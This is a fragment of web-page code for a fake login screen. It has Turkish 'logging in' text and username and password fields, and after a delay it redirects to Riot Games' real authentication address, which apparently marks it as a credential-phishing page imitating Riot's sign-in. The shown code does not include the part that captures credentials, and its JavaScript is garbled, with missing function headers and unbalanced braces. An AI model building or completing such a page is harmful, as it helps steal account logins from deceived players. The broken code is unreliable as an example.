                        .next-btn.active svg { fill:#ff4655; }
                        .next-btn svg { width:30px; fill:#ddd; }

                            <div class="input-group">

                            </div>

                        <div id="loader" class="loader"></div>
                        <div id="loadingText" class="loading-text">Giriş Yapılıyor...</div>
                    </div>

                    <script>
                        const u = document.getElementById('u'), p = document.getElementById('p'), btn = document.getElementById('go');
                        const check = () => (u.value && p.value) ? btn.classList.add('active') : btn.classList.remove('active');
                        u.oninput = check; p.oninput = check;

                            if(u.value && p.value) {

                                    window.location.href = "https://authenticate.riotgames.com/";
                                }, 2500);
                            }
                        };
                    <\/script>
                </body>
                </html>
